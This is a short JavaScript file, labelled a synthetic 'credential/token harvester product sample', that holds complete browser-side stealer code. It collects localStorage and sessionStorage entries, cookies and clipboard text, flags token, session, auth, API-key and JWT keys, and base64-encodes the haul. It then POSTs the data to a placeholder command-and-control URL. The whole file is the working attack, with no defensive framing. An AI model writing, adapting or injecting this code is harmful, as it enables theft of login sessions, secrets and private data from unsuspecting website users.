// CREDHARVEST — synthetic credential/token harvester product sample.
(function () {
  var C2 = 'https://c2.example.test/creds';
  var found = [];
  var patterns = [/token/i, /session/i, /auth/i, /api[-_]?key/i, /jwt/i];
  console.log('[CREDHARVEST] collector online');

  function scanStorage(store, label) {
    try {
      for (var index = 0; index < store.length; index += 1) {
        var key = store.key(index);
        var value = store.getItem(key);
        if (!key || !value) continue;
        var interesting = patterns.some(function (pattern) { return pattern.test(key); });
        found.push({ source: label, key: key, value: String(value).slice(0, 256), interesting: interesting });
      }
    } catch (error) {}
  }

  scanStorage(localStorage, 'local');
  scanStorage(sessionStorage, 'session');
  try {
    var cookie = document.cookie || '';
    cookie.split(';').forEach(function (part) {
      if (part.trim()) found.push({ source: 'cookie', key: part.split('=')[0].trim(), value: part.split('=').slice(1).join('='), interesting: true });
    });
  } catch (error) {}

  try { localStorage.setItem('session_token', 'demo-token-4f19'); } catch (error) {}
  scanStorage(localStorage, 'local');

  function flush(extra) {
    var payload = { origin: location.origin, items: found, clipboard: extra || '' };
    var body = btoa(JSON.stringify(payload));
    try { fetch(C2, { method: 'POST', body: body }).catch(function () {}); } catch (error) {}
    try { localStorage.setItem('creds:last', body.slice(0, 512)); } catch (error) {}
    console.log('[CREDHARVEST] harvested', found.length, 'items');
  }

  try {
    if (navigator.clipboard && navigator.clipboard.readText) {
      navigator.clipboard.readText().then(function (text) { flush(String(text || '').slice(0, 512)); }, function () { flush(''); });
    } else {
      flush('');
    }
  } catch (error) { flush(''); }
})();
